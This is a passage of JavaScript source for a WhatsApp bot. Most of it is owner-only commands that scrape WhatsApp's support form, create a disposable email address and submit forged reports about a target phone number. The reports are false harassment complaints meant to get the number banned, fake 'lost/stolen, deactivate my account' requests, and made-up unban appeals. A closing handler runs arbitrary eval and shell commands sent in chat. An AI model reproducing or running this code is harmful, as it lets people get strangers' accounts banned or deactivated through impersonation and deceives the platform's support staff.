m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break
//=================================================//
case 'listseller':
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
 teksooo = '*List Premium*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
ReonStore.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break
case 'bannedv1': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Please help WhatsApp, I am very uncomfortable with this number  +${targetnya}, because this number has threatened me with spam chats that harass me, please help WhatsApp... Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanned': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv2': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv3': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv4': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv5': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Reon🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'verif@': case 'kenon': {
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'remini':
			case 'hd': {
			if (!isZeroone) return m.reply(`*Maaf, Command ini Khusus untuk Developer Bot WhaWhatsApp*`)
			if (!quoted) return m.reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
		    await loading()
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			ReonStore.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
//=================================================
case 'delchat': case 'del': case 'delete':{
ReonStore.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break

//=================================================
default:
if (budy.startsWith('=>')) {
if (!isZeroone) return m.reply('*Khusus Premium*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isZeroone) return m.reply('*Khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isZeroone) return m.reply('*Khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
ReonStore.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
